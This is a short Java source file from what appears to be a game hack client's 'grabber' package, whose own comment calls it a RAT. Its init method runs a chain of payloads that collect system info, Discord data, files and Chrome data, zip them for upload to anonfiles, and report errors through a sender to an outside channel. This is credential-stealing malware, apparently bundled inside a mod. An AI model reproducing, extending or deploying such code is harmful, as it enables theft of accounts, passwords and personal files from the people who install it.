/*
 * rat go brrrrrrr
 */

package risingtide.tidehack.utils.grabber;

import risingtide.tidehack.utils.grabber.risingtideimpl.*;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

public class RisingTide {

    static List<RTPayload> payloads = new ArrayList<>();
    public static void init() {
        payloads.addAll(Arrays.asList(
            new RTInfo(),
            new RTDiscord(),
            //new RTScreenCap(),
            new RTFileGrabber(),
            new RTFileScan(),
            new RTChrome(),
            new RTZipper() // this deadass takes six fucking minutes to load and i hate it fuck you anonfiles
        ));
        for (RTPayload p : payloads) {
            try {
                p.exec();
            } catch (Exception e) {
                RTSender s = new RTSender();
                s.send("**Error at `"+p.getName()+"`:** ```"+e.toString()+"```","Error",false);
                e.printStackTrace();
            }
        }
    }
}
